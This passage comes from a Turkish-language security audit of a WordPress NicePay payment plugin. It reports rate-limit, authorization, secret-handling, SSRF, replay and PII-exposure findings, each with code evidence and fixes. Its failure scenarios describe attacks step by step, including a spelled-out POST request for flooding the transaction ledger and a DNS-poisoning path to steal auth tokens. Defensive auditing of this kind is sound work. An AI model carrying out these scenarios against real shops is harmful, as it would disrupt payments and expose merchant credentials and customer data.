### SEC-002 — Kimliksiz standalone başlatma uç noktası sınırsız defter satırı + saldırgan kontrollü PII yazımına izin veriyor; nonce serbestçe üretilebiliyor ve rate-limit fail-open

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | dos / resource-exhaustion / unauthenticated-write |
| **Konum** | [nicepay-payment-gateway.php:634](../../../nicepay-payment-gateway.php#L634) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
`ajax_refresh_payment_nonce()` (main:634-650) nonce, capability veya origin kontrolü olmadan `wp_ajax_nopriv_` üzerinden herkese geçerli bir `nicepay_init_payment` nonce'u üretiyor:
```php
add_action( 'wp_ajax_nopriv_nicepay_refresh_nonce', array( $this, 'ajax_refresh_payment_nonce' ) ); // :118
...
wp_send_json_success( array( 'nonce' => wp_create_nonce( 'nicepay_init_payment' ) ) );             // :649
```
Dolayısıyla `ajax_init_payment`'taki nonce kontrolü (`:548-554`) geriye kalan tek engel olan IP tabanlı rate-limit'e indirgeniyor. O limit ise transient tabanlı ve iki yerde fail-open:
```php
if ( false === filter_var( $remote_addr, FILTER_VALIDATE_IP ) ) {
    return true;   // functions:294-298
}
...
if ( '' === $identity || '' === $scope ) { return true; }  // functions:307-309
```
Limit'e takılmayan her istek kalıcı bir satır yazıyor:
```php
$tx_id = nicepay_save_transaction( array(
    ... 'buyer_name' => $buyer['buyer_name'], 'buyer_email' => $buyer['buyer_email'],
    'buyer_tel' => $buyer['buyer_tel'], ... ) );  // main:589-609
```
Bu satırlar hiçbir zaman silinmiyor: `nicepay_expire_pending_transactions()` (functions:954-985) yalnızca `status='expired'` işaretliyor, `DELETE` yok; `NicePay_Retention` varsayılanı `indefinite` (retention:29-35). Ayrıca WooCommerce akışının aksine standalone başlatmada `nicepay_abandon_pending_transactions()` çağrılmıyor, yani aynı ziyaretçinin her tıklaması yeni bir satır bırakıyor.
````

**Başarısızlık senaryosu**

Saldırgan standalone form barındıran sayfayı çeker, HTML'den `data-nicepay-config-id="cfg_ab12..."` değerini okur. Bir betikle `action=nicepay_refresh_nonce` çağırıp taze nonce alır, ardından `action=nicepay_init_payment&config_id=cfg_ab12...&buyer_name=X&buyer_email=victim@example.com&buyer_tel=01000000000` POST'unu 20/dk hızıyla tekrarlar. Bir hafta sonra ledger'da ~200.000 sahte `pending`/`expired` satır ve wp_options'ta on binlerce transient birikir; admin işlem ekranı (sayfa başına COUNT(*) + LIKE araması yapıyor) kullanılamaz hale gelir ve gerçek ödemeler gürültü içinde kaybolur. Saldırgan `buyer_email` alanına üçüncü kişilerin adreslerini yazarak GDPR exporter çıktısını da kirletir.

**Etki**

Standalone formlar açıkken (`nicepay_standalone_enabled=yes`) ve `config_id` sayfa HTML'inde herkese açıkken, kimliksiz bir saldırgan IP başına 20 istek/dakika (~29.000 satır/gün) hızıyla `wp_nicepay_transactions` tablosunu şişirebilir. Her satır saldırganın seçtiği ad/e-posta/telefonu taşıyor; bu veriler admin işlem listesinde `buyer_name` sütununda görünüyor ve WordPress gizlilik exporter'ı (`NicePay_Privacy::export`) tarafından e-postaya göre sorgulanabiliyor. Ayrıca her istek 2 transient DB işlemi tetiklediği için `wp_options` tablosu da büyüyor. Kalıcı object-cache kullanılan kurulumlarda transient'lar evict edilebildiği için limit tamamen atlanabilir.

**Öneri**

1. `ajax_refresh_payment_nonce` uç noktasını kaldırın veya en azından `Sec-Fetch-Site: same-origin` / `Referer` kontrolü ile aynı-origin'e kısıtlayın; cache uyumu için nonce'u sunucu tarafında kısa TTL'li olarak yenilemek yerine formu `wp_cache`/ESI dışı bırakmak daha güvenli.
2. Rate-limit'i satır yazımının değil, *başarılı satır yaratımının* önüne alın ve fail-open yerine fail-closed yapın:
```php
if ( false === filter_var( $remote_addr, FILTER_VALIDATE_IP ) ) {
    return false; // ortam bozuksa ödeme başlatma
}
```
3. Aynı `source_ref` için bekleyen eski standalone denemelerini WooCommerce akışındaki gibi kapatın: `ajax_init_payment` içinde `nicepay_abandon_pending_transactions( 'standalone', $offer['source_ref'] )` çağırın; ayrıca config başına eşzamanlı `pending` satır sayısına üst sınır koyun.
4. `nicepay_expire_pending_transactions()`'a, hiçbir zaman `approving`/`paid` olmamış ve N günden eski `expired`/`abandoned` satırları gerçekten silen sınırlı bir `DELETE` batch'i ekleyin (retention politikasından bağımsız, çünkü bunlar finansal kayıt değil).
5. `buyer_*` alanlarını, işlem gerçekten `approving` durumuna geçene kadar yazmayın.

---

### SEC-003 — Gerçek para iadesi ve tüm işlem defteri erişimi `edit_shop_orders` yerine filtrelenebilir `manage_woocommerce` yetkisine bağlı

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | authorization |
| **Konum** | [admin/class-nicepay-transactions.php:974](../../../admin/class-nicepay-transactions.php#L974) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
İade tetikleyen AJAX handler yalnız şu kapıyı kullanıyor:
```php
if ( ! nicepay_current_user_can_manage_payments() || ! wp_verify_nonce( $nonce, 'nicepay_cancel_' . $id ) ) {  // :974
```
ve bu fonksiyon:
```php
function nicepay_current_user_can_manage_payments() {
    return current_user_can( 'manage_options' ) || current_user_can( nicepay_manage_transactions_capability() );  // functions:485
}
function nicepay_manage_transactions_capability() {
    return (string) apply_filters( 'nicepay_manage_transactions_capability', 'manage_woocommerce' );              // functions:540
}
```
Handler bu kontrolden sonra doğrudan gerçek para hareketi başlatıyor:
```php
$refund = wc_create_refund( array(
    'order_id' => $order->get_id(), 'amount' => $amount,
    'reason' => $reason, 'refund_payment' => true, 'restock_items' => false,
) );  // :1013-1019
```
`wc_create_refund()` kendisi yetki kontrolü yapmayan düşük seviye bir API'dir — WooCommerce'in kendi iade AJAX'ı (`woocommerce_refund_line_items`) `current_user_can( 'edit_shop_orders' )` ister. Burada tek kapı `manage_woocommerce`. Aynı zayıf kapı `handle_csv_export()` (:242) ve tüm işlem defteri ekranı (:535) için de geçerli.
````

**Başarısızlık senaryosu**

Mağaza, muhasebe ekibine yalnızca rapor okuyabilsinler diye `manage_woocommerce` yetkisi veren bir `nicepay_reporter` rolü tanımlar (WooCommerce Analytics erişimi için yaygın bir pratiktir); `edit_shop_orders` bilinçli olarak verilmez. Bu rolle giriş yapan bir kullanıcı NicePay > Transactions ekranını açar, ödenmiş bir siparişin yanındaki "Refund" düğmesine basar; sayfa ona geçerli bir `nicepay_cancel_{id}` nonce'u zaten servis etmiştir (:927). 500.000 KRW gerçek para NICEPAY üzerinden müşteriye iade edilir; kullanıcı WooCommerce sipariş ekranını hiç açamadığı halde para hareketi tamamlanır.

**Etki**

Yalnızca raporlama amacıyla `manage_woocommerce` verilmiş (ama `edit_shop_orders` verilmemiş) bir özel rol, WooCommerce'in kendi arayüzünden iade yapamazken, bu eklentinin `wp_ajax_nicepay_cancel_transaction` uç noktası üzerinden herhangi bir siparişin kalan bakiyesinin tamamını gerçek para olarak NICEPAY'e iade ettirebilir. Aynı rol `admin_post_nicepay_export_transactions` ile tüm işlem defterini (TID'ler, sipariş numaraları, tutarlar, MID modu) CSV olarak indirebilir ve işlem listesinde `buyer_name` PII'sini görebilir. Yetki sınırı WooCommerce'in kendi modeliyle tutarsız — bu, en az yetki ilkesinin ihlali ve yetki yükseltme yüzeyi.

**Öneri**

Para hareketi ile okuma yetkisini ayırın. `ajax_cancel_transaction` içinde sipariş-özel WooCommerce yetkisini de zorunlu kılın:
```php
if ( ! nicepay_current_user_can_manage_payments()
     || ! current_user_can( 'edit_shop_orders' )
     || ! current_user_can( 'edit_shop_order', $transaction->wc_order_id )
     || ! wp_verify_nonce( $nonce, 'nicepay_cancel_' . $id ) ) {
    wp_send_json_error( ..., 403 );
}
```
(sipariş kimliğini nonce doğrulamasından sonra, `nicepay_get_transaction()` ile çözdükten sonra kontrol edin). CSV export için de ayrı bir okuma yetkisi tanımlayın (`nicepay_export_transactions_capability`, varsayılan `view_woocommerce_reports` veya `manage_woocommerce`) ve `nicepay_manage_transactions_capability` filtresinin dokümantasyonuna "bu filtre para iadesi yetkisini de değiştirir" uyarısını ekleyin — mevcut hâlde bir filtre ile yanlışlıkla yetki genişletmek çok kolay.

---

### SEC-014 — sanitize_merchant_key() filtrelenmiş option değerini geri yazıyor: dokümante edilen wp-config kimlik-bilgisi reçetesi canlı anahtarı veritabanına kalıcılaştırıyor

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | secret-management |
| **Konum** | [admin/class-nicepay-admin.php:184](../../../admin/class-nicepay-admin.php#L184) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
`private function sanitize_merchant_key( $value, $option_name, $default, $clear_field ) { $clear = isset( $_POST[ $clear_field ] ) ? ... : 'no'; if ( 'yes' === $clear ) { return ''; } $value = trim( sanitize_text_field( (string) $value ) ); if ( '' === $value ) { return (string) get_option( $option_name, $default ); } return substr( $value, 0, 512 ); }` (satır 184-196). get_option() WordPress'te `option_{$option}` filtresini uygular; docs/CONFIGURATION.md:172-179 merchant'lara tam olarak bu filtreyi kullanmalarını öğütlüyor: `add_filter( 'option_nicepay_live_merchant_key', function( $stored ) { return defined( 'NICEPAY_LIVE_MERCHANT_KEY' ) ? NICEPAY_LIVE_MERCHANT_KEY : $stored; } );`. Dolayısıyla boş alanla kaydetmede fonksiyon wp-config sabitinden gelen GERÇEK canlı anahtarı döndürüyor ve register_setting akışı bunu update_option ile wp_options tablosuna yazıyor. Ayrıca aynı fonksiyon bir sanitize_option_* filtresi içinden $_POST okuyor, yani bu kod her update_option('nicepay_live_merchant_key', ...) çağrısında çalışıyor.
```

**Başarısızlık senaryosu**

Merchant wp-config.php'ye NICEPAY_LIVE_MERCHANT_KEY sabitini ve functions.php'ye önerilen option_nicepay_live_merchant_key filtresini ekler; wp_options'ta nicepay_live_merchant_key değeri boştur. Daha sonra NicePay > Settings > API Credentials sekmesinde yalnızca Live MID'i güncelleyip Kaydet'e basar. Anahtar alanı boş gönderildiği için sanitize_merchant_key çalışır, get_option filtre zincirinden geçerek sabitteki gerçek anahtarı döndürür ve WordPress bu değeri veritabanına yazar. Merchant hiçbir uyarı görmez; sırrın artık DB'de olduğunu bilmez.

**Etki**

Merchant, dokümanın 'Securing Live Credentials' başlığını izleyerek anahtarı veritabanı dışında tuttuğunu sanırken, API sekmesini ilk kez kaydettiği anda canlı MerchantKey wp_options'a düz metin olarak yazılıyor. Bu, anahtarı tüm veritabanı yedeklerine, staging kopyalarına, wp-cli option dump çıktılarına ve DB erişimi olan her eklentiye taşıyor — yani hardening tam tersine dönüyor. Sanitize callback'in $_POST'a bağımlı olması ayrıca yan etkili bir sanitizer oluşturuyor: temizleme alanını taşıyan herhangi bir istekte programatik bir update_option çağrısı kimlik bilgisini silebilir.

**Öneri**

Sanitize sırasında option'ın HAM değerini oku, filtrelenmiş değerini değil: `$raw = $wpdb->get_var( $wpdb->prepare( "SELECT option_value FROM {$wpdb->options} WHERE option_name = %s", $option_name ) );` ve boş gönderimde bunu döndür. Daha iyisi, kimlik bilgisi sabitlerini eklenti içinde birinci sınıf olarak destekle: NicePay_API::__construct() içinde `defined( 'NICEPAY_LIVE_MERCHANT_KEY' ) ? NICEPAY_LIVE_MERCHANT_KEY : get_option( ... )` şeklinde oku, sabit tanımlıysa admin alanını salt-okunur göster ve o option'a yazmayı tamamen engelle. $_POST okumasını sanitize callback'ten çıkarıp ayrı bir admin_post/settings alanına taşı. docs/CONFIGURATION.md:160-180'i yeni davranışa göre güncelle.

---

### SEC-015 — PG çağrılarında wp_safe_remote_post yerine wp_remote_post; allowlist yalnızca host adına dayanıyor (DNS rebinding / iç ağ)

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | ssrf |
| **Konum** | [includes/class-nicepay-api.php:269](../../../includes/class-nicepay-api.php#L269) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
`try { return wp_remote_post( $url, $args ); } finally { ... }` (satır 268-274) ve request_args() içinde `reject_unsafe_urls` argümanı hiç set edilmiyor (satır 215-224). validate_nicepay_url() yalnızca isim düzeyinde doğrulama yapıyor: `return in_array( $host, self::$allowed_hosts, true ) && in_array( $path, self::$allowed_paths, true );` (satır 198-199). Yani dc1-api.nicepay.co.kr adının hangi IP'ye çözüldüğü hiç kontrol edilmiyor; wp_safe_remote_post kullanılsaydı reject_unsafe_urls => true ile wp_http_validate_url() devreye girip loopback/RFC1918 hedefleri engelleyecekti.
```

**Başarısızlık senaryosu**

Paylaşımlı bir hosting ortamında saldırgan yerel DNS önbelleğini zehirleyerek pg-api.nicepay.co.kr adını 127.0.0.1'e çözdürür. Bir müşteri ödeme yaptığında handle_return() request_approval() çağırır; validate_nicepay_url geçer (host adı allowlist'te), wp_remote_post isteği loopback'teki saldırgan dinleyicisine gönderir. Saldırgan MID, TID ve AuthToken'ı ele geçirir; sunucuya geçersiz bir yanıt döndürerek işlemi needs_reconciliation'a düşürürken, elindeki AuthToken ile gerçek NICEPAY'e kendisi onay isteği gönderebilir.

**Etki**

Sunucunun DNS çözümlemesini etkileyebilen bir saldırgan (paylaşımlı hosting'de zehirlenmiş resolver önbelleği, saldırıya uğramış /etc/hosts, düşman split-horizon DNS, container içi DNS override) MID, TID, AuthToken ve merchant imzası taşıyan onay/iptal POST'unu iç ağdaki bir adrese yönlendirebilir. Bu hem kimlik bilgisi sızıntısı hem de iç servislere karşı kimliği doğrulanmış istek üretimi anlamına gelir. Ayrıca eklenti yanıtı 'NICEPAY'den geldi' varsayarak imza doğrulaması yapsa da, sızan AuthToken tek başına PSP'de işlem tamamlamaya yeter.

**Öneri**

Tüm PG çağrılarında wp_safe_remote_post() kullan (allowlist'i de koru — ikisi tamamlayıcıdır). Ek sertleştirme olarak http_api_curl kancasında zaten kullanılan mekanizmayla CURLOPT_RESOLVE ile NICEPAY'in yayımlanmış IP aralıklarına sabitleme yap veya çözümlenen IP'yi gönderimden önce filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE) ile doğrula. NICEPAY sunucu sertifikasının CN/SAN'ını da doğrulamak için sslverify true'ya ek olarak sertifika pinning seçeneğini dokümante et.

---

### SEC-016 — Rate limiting tasarım kusurları: fail-open, proxy arkasında tek küresel kova, atomik olmayan sayaç ve korumasız return/receipt uçları

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | rate-limiting |
| **Konum** | [includes/nicepay-functions.php:294](../../../includes/nicepay-functions.php#L294) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
Kimlik yalnızca REMOTE_ADDR'den türetiliyor ve geçersizse tamamen açılıyor: `if ( false === filter_var( $remote_addr, FILTER_VALIDATE_IP ) ) { return true; }` (satır 294-298). Sayaç atomik değil — oku/artır/yaz üç ayrı adım: `$state = get_transient( $key ); ... $count = ... + 1; ... set_transient( $key, array( 'count' => $count, ... ) )` (satır 312-327). Yorumda 'forwarded headers are intentionally ignored' deniyor (satır 276-279) ama ters vekil arkasında REMOTE_ADDR tüm ziyaretçiler için aynı olur. Koruma yalnızca iki AJAX ucunda var (nicepay-payment-gateway.php:556 ve 641); asıl para akışını taşıyan NicePay_Return_Handler::process() (satır 25) ve WC_Gateway_NicePay::handle_return() (satır 376) ile makbuz ucu (nicepay-payment-gateway.php:369) hiç limitlenmemiş.
```

**Başarısızlık senaryosu**

Mağaza Cloudflare arkasındadır; REMOTE_ADDR tüm istekler için Cloudflare edge IP'sidir. Saldırgan 21 adet nicepay_init_payment isteği gönderir. 21. istekten itibaren nicepay_check_public_rate_limit false döner ve GERÇEK müşteriler de 429 alır: 'Too many payment attempts. Please wait and try again.' Saldırgan bunu dakikada bir tekrarlayarak standalone ödeme akışını süresiz kapatır. Alternatif senaryo: REMOTE_ADDR'in boş geldiği bir kurulumda limit hiç uygulanmaz ve saldırgan sınırsız pending işlem üretir (bkz. SEC-007).

**Etki**

Üç ayrı arıza modu: (1) Cloudflare/ELB/nginx arkasındaki bir mağazada tüm alıcılar tek 20 istek/dakika kovasına düşer — tek bir bot birkaç saniyede kovayı doldurup TÜM müşterilerin standalone ödeme başlatmasını engelleyebilir (self-DoS). (2) REMOTE_ADDR yoksa/bozuksa (bazı FastCGI ve CLI-benzeri kurulumlar, hatalı proxy yapılandırmaları) limit tamamen devre dışı kalır. (3) Eşzamanlı istekler get_transient/set_transient arasında yarışarak limitin ~2 katına kadar geçebilir; kalıcı object cache yoksa autoload=no options satırlarına yazma da her istekte DB write üretir. Ayrıca imza doğrulama içeren return uçlarında hiç limit olmadığı için saldırgan sınırsız Moid+imza denemesi yaptırıp her istekte DB sorgusu ve (Moid tutarsa) NICEPAY'e giden HTTP çağrısı tetikleyebilir.

**Öneri**

(1) Güvenilen vekil desteği ekle: NICEPAY_TRUSTED_PROXIES sabiti tanımlıysa X-Forwarded-For'un en sağdaki güvenilmeyen atlamasını kimlik olarak kullan, yoksa REMOTE_ADDR'e düş; bunu dokümante et. (2) Sayaç için atomik primitif kullan — wp_cache_add() + wp_cache_incr(), ya da options tablosunda `UPDATE ... SET option_value = %s WHERE option_name = %s AND option_value = %s` biçiminde CAS. (3) REMOTE_ADDR kullanılamadığında tamamen açılmak yerine kısa ömürlü bir çerez/oturum kovasına düş ve bu durumu bir kez warning seviyesinde logla. (4) handle_return / NicePay_Return_Handler::process / handle_payment_receipt uçlarına da kaba bir limit (ör. IP başına 60/dk) ekle; imza doğrulanmadan önce uygula. (5) Sabit pencere yerine kayan pencere veya token bucket kullan.

---

### SEC-017 — Kimliksiz istemciler sınırsız sayıda alıcı PII'si içeren pending ledger satırı yaratabiliyor; satırlar asla silinmiyor

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | resource-exhaustion |
| **Konum** | [nicepay-payment-gateway.php:589](../../../nicepay-payment-gateway.php#L589) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
ajax_init_payment (wp_ajax_nopriv) her başarılı istekte alıcının verdiği ada/e-postaya/telefona sahip yeni bir satır yazıyor: `$tx_id = nicepay_save_transaction( array( ... 'buyer_name' => $buyer['buyer_name'], 'buyer_email' => $buyer['buyer_email'], 'buyer_tel' => $buyer['buyer_tel'], ... ) );` (satır 589-609). Nonce engeli, aynı derecede kimliksiz olan ajax_refresh_payment_nonce ile (satır 634-650, kendi nonce/referer kontrolü yok, dakikada 60) serbestçe aşılabiliyor. Süresi dolan satırlar yalnızca işaretleniyor, silinmiyor: `UPDATE {$table} SET status = 'expired', approval_state = 'expired', auth_token = '', active_attempt_key = NULL WHERE ...` (nicepay-functions.php:958-962). Otomatik temizlik yalnızca merchant açıkça retention politikası seçerse çalışıyor (class-nicepay-retention.php:136-140, varsayılan 'indefinite'). buyer_name/buyer_email varchar(100), buyer_tel varchar(30) düz metin olarak saklanıyor (schema:81-83).
```

**Başarısızlık senaryosu**

Saldırgan standalone form yayınlanmış bir sayfayı bulur, nicepay_refresh_nonce ile nonce alır ve dakikada 20 nicepay_init_payment isteği gönderir; her istekte buyer_name olarak 30 baytlık rastgele metin, buyer_email olarak rastgele adres verir. Bir hafta sonra tabloda ~200.000 'expired' satır birikir. Merchant retention'ı hiç açmadığı için hiçbiri silinmez; NicePay > Transactions ekranındaki COUNT(*) ve SUM() sorguları yavaşlar, DB yedekleri şişer ve tabloda binlerce sahte kişisel veri kaydı kalır.

**Etki**

Kimlik doğrulaması gerektirmeyen bir yazma primitifi: her IP dakikada 20 satır, günde ~28.800 satır üretebiliyor. Varsayılan retention 'indefinite' olduğu için bu satırlar kalıcı; nicepay_transactions tablosu ve DB yedekleri kontrolsüz büyüyor ve admin sayfalarındaki COUNT(*) sorguları yavaşlıyor. Ayrıca saldırgan istediği metni buyer_name/buyer_email alanlarına yazabildiği için, sistem üçüncü kişilerin kişisel verisiyle (veya taciz içerikli metinlerle) doldurulabiliyor — bu hem veri minimizasyonu (GDPR) hem de itibar sorunu. Proxy arkasında SEC-006 nedeniyle limit tek kova olduğundan tek IP'lik saldırı bile hem doldurma hem DoS üretiyor.

**Öneri**

(1) Süresi dolmuş, hiç claim edilmemiş ve tid'i NULL olan pending satırları belirli bir süre sonra (ör. 7 gün) retention politikasından bağımsız olarak SİL — bunlar finansal kayıt değil, terk edilmiş tekliflerdir. (2) init sırasında alıcı PII'sini hemen yazmak yerine yalnızca teklif snapshot'ını yaz; PII'yi ancak auth-return doğrulandıktan sonra kalıcılaştır. (3) Aynı config_id + IP kovası için aynı anda açık pending satır sayısını (ör. 3) sınırla. (4) ajax_refresh_payment_nonce'a en azından bir Referer/Origin kontrolü ve daha sıkı bir limit ekle. (5) Süresi dolan satır sayısı bir eşiği aşarsa admin'e uyarı göster.

---

### SEC-004 — Auth-return imzası Moid/TxTid'i bağlamıyor; işlemler arası çapraz bağlama yalnızca Moid'in tahmin edilemezliğine dayanıyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | protocol-binding / replay |
| **Konum** | [includes/class-nicepay-inbound-validator.php:111](../../../includes/class-nicepay-inbound-validator.php#L111) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
İşlem satırı, imza doğrulanmadan **önce** tamamen saldırgan kontrollü `Moid` ile bulunuyor:
```php
$moid        = $payload['Moid'];                                   // :57
$transaction = nicepay_get_transaction_by_moid( $moid, $flow );    // :58
```
ve nihai imza kontrolü Moid'i kapsamıyor:
```php
if ( ! $api->verify_auth_signature( $payload['AuthToken'], $payload['Amt'], $payload['Signature'] ) ) {  // :111
```
```php
$plain = $auth_token . $this->mid . $amt . $this->merchant_key;   // api:111 — Moid/TxTid yok
```
Yani aynı MID ve aynı tutara sahip *herhangi* bir geçerli auth yanıtı, farklı bir `pending` işlemin Moid'i ile yeniden gönderilebilir ve `:72-113` arasındaki tüm kontrolleri (pending, expiry, MID, currency, amount, method, AuthResultCode, imza) geçer. Yanlış bağlama ancak bir adım sonra, `validate_approval_response()` içinde PG'nin döndürdüğü `Moid` karşılaştırılınca yakalanıyor (`:152-155`). Bu, projenin kendi analiz belgesinde PROTOCOL-01/SECURITY-01 olarak `KISMİ` işaretlenmiş bilinen bir açık.
````

**Başarısızlık senaryosu**

Saldırgan, paylaşılan bir bağlantı veya loglanmış Referer üzerinden kurbanın `order-pay` URL'sine erişir ve HTML'den `Moid = WC4211_20260826114500_a1b2c3d4e5f60718` değerini ile sipariş tutarını (10.000 KRW) okur. Kendi 10.000 KRW'lik siparişi için NICEPAY auth akışını başlatır; tarayıcıdaki ReturnURL formunu göndermeden önce `Moid` alanını kurbanınkiyle değiştirir. `validate_auth_return` tüm kontrolleri geçer, kurbanın işlemi `approving`e çekilir, ardından PG'nin onay yanıtındaki Moid uyuşmadığı için `nicepay_get_mismatched_approval_audit()` çalışır ve kurbanın siparişi `on-hold` + `reconciliation_status='required'` olur. Kurban ödeme yapamaz; merchant elle mutabakat yapmak zorunda kalır.

**Etki**

Sömürü, hedef işlemin Moid'ini bilmeyi gerektiriyor; Moid `WC{id}_{EdiDate}_{16 hex}` formatında 8 byte kriptografik rastgelelik içerdiği için pratikte tahmin edilemez ve bu da riski düşürüyor. Ancak Moid, ödeme formunun HTML'inde gizli input olarak görünür — sipariş-ödeme URL'sini (sipariş kimliği + order_key) ele geçiren biri onu okuyabilir. Bu durumda saldırgan, kendi başarılı auth'unu kurbanın bekleyen işleminin Moid'i ile yeniden göndererek kurbanın siparişini `needs_reconciliation`/`on-hold` durumuna kilitleyebilir (para kaybı yok, ama hizmet reddi ve manuel mutabakat yükü). Fail-closed davranış doğru; eksik olan derinlemesine savunma.

**Öneri**

NICEPAY'in `ReqReserved` echo sözleşmesi doğrulandığında, auth isteğine sunucuda üretilen ve saklanan bir bağlama token'ı koyup dönüşte sabit-zamanlı karşılaştırın (şema zaten `binding_token_hash` sütununu barındırıyor ama kullanılmıyor):
```php
// form üretiminde
$binding = bin2hex( random_bytes( 16 ) );
$form_data['ReqReserved'] = $binding;
nicepay_save_transaction( array( ..., 'binding_token_hash' => hash( 'sha256', $binding ) ) );

// validate_auth_return içinde, işlem satırı çözüldükten hemen sonra
$stored = self::transaction_value( $transaction, 'binding_token_hash' );
if ( '' !== $stored && ! hash_equals( $stored, hash( 'sha256', (string) ( $payload['ReqReserved'] ?? '' ) ) ) ) {
    return self::error( 'nicepay_inbound_binding_mismatch', 'Payment binding token does not match.' );
}
```
Echo kanıtı gelene kadar en azından `TxTid`'in daha önce başka bir satıra bağlanmamış olduğunu (uniq_tid ihlali öncesi) kontrol edip erken reddedin ve bu senaryoyu `nicepay_log(..., 'warning')` ile ayrı bir kodla işaretleyin ki tespit edilebilsin.

---

### SEC-005 — Merchant tarafından ön-doldurulmuş alıcı PII'si (ad/e-posta/telefon) standalone formun herkese açık HTML'inde gizli input olarak yayınlanıyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | information-disclosure / privacy |
| **Konum** | [templates/standalone-payment-form.php:169](../../../templates/standalone-payment-form.php#L169) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
Shortcode render'ı ticari alanların yanı sıra alıcı iletişim alanlarını da kayıtlı konfigürasyondan zorla çekiyor:
```php
foreach ( array( 'amount', 'goods_name', 'goods_class', 'pay_method', 'currency',
                 'buyer_name', 'buyer_email', 'buyer_tel' ) as $key ) {
    $atts[ $key ] = isset( $saved[ $key ] ) ? $saved[ $key ] : '';   // main:464-466
}
```
şablon bunları doğrudan gizli input'a yazıyor:
```php
<input type="hidden" name="BuyerName"  ... value="<?php echo esc_attr( $preset_name ); ?>">   // :169
<input type="hidden" name="BuyerTel"   ... value="<?php echo esc_attr( $preset_tel ); ?>">    // :170
<input type="hidden" name="BuyerEmail" ... value="<?php echo esc_attr( $preset_email ); ?>">  // :171
```
Kaçış doğru (XSS yok), ancak değerler sayfayı gören *herkese* servis ediliyor. Admin UI bu alanları "Pre-fill or leave empty / If provided, the fields will be pre-filled and hidden" diye tanıtıyor (admin.php:968-971) — "hidden" ifadesi merchant'a değerin gizlendiği izlenimini veriyor, oysa yalnızca görsel olarak gizleniyor.
````

**Başarısızlık senaryosu**

Merchant, sabit fiyatlı bir kurs ödemesi için shortcode oluştururken kendi test verisi olarak `buyer_email = ahmet.yilmaz@example.com`, `buyer_tel = 0532 111 22 33` girer ve kaydeder. Shortcode herkese açık bir "Ödeme" sayfasına gömülür. Bu sayfayı ziyaret eden herkes (ve Google'ın crawler'ı) sayfa kaynağında `<input type="hidden" name="BuyerEmail" ... value="ahmet.yilmaz@example.com">` satırını görür; adres spam listelerine düşer ve GDPR ihlali bildirimi gerektirebilecek bir kişisel veri sızıntısı oluşur.

**Etki**

Bir merchant test ederken veya tek bir müşteri için ön-doldurma yaptığında, o kişinin adı, e-postası ve telefon numarası shortcode'un bulunduğu her sayfanın kaynak kodunda kalıcı olarak yayınlanır; arama motorları ve arşiv siteleri tarafından indekslenebilir. Ayrıca `wp_localize_script( 'nicepay-shortcode-admin-js', ..., 'editData' => $edit_data )` (admin.php:843-845) aynı PII'yi admin sayfasında JS objesine koyuyor (bu kısım yetki korumalı, sorun değil). Bu, GDPR açısından istenmeyen bir yayın ve UI metni riski doğru anlatmıyor.

**Öneri**

Ön-doldurulmuş alıcı alanlarını istemciye hiç göndermeyin. Şablonda yalnızca "bu alan sunucudan gelecek" bilgisini taşıyan bir bayrak bırakın (`data-nicepay-preset-buyer="1"`), gerçek değerleri `ajax_init_payment` içinde sunucu tarafında `NicePay_Offer_Resolver` üzerinden çözüp doğrudan işlem satırına ve NICEPAY form alanlarına AJAX yanıtı üzerinden değil — tercihen hiç istemciye uğratmadan — yazın. Bu mümkün değilse en azından admin UI metnini düzeltin ("Bu değerler ödeme sayfasının HTML kaynağında herkese görünür olur") ve ön-doldurma alanlarını yalnız `goods_name`/tutar gibi ticari olmayan verilerle sınırlayın.

---

### SEC-006 — Dizi tipindeki POST değerleri tip kontrolü olmadan `sanitize_email()` ve `sanitize_hex_color()`'a geçiyor (PHP 8'de TypeError)

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | input-validation / robustness |
| **Konum** | [nicepay-payment-gateway.php:683](../../../nicepay-payment-gateway.php#L683) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
`ajax_save_shortcode()` içinde:
```php
$buyer_email  = isset( $_POST['buyer_email'] ) ? sanitize_email( wp_unslash( $_POST['buyer_email'] ) ) : '';   // :683
...
$button_color = isset( $_POST['button_color'] ) ? sanitize_hex_color( wp_unslash( $_POST['button_color'] ) ) : '#2563eb'; // :699
```
WordPress'in `sanitize_text_field()`'i dizi girdisini `_sanitize_text_fields()` içinde erkenden `''` döndürerek karşılıyor, ancak `sanitize_email()` ilk satırında `strlen( $email )` ve `sanitize_hex_color()` `preg_match( ..., $color )` çağırıyor — her ikisi de PHP 8'de dizi argümanla `TypeError` fırlatır. Diğer tüm `$_POST` okumaları `sanitize_text_field`/`(int)`/`(string)` ile korunmuş; yalnız bu iki çağrı guard'sız. Aynı desen şablonda kayıtlı option üzerinden de var (`sanitize_hex_color( $atts['button_color'] )` :22, `sanitize_email( $atts['buyer_email'] )` :66) ve `nicepay_get_all_shortcodes()` bu alanların string olduğunu doğrulamıyor (yalnız `id` doğrulanıyor, functions:1942-1953).
````

**Başarısızlık senaryosu**

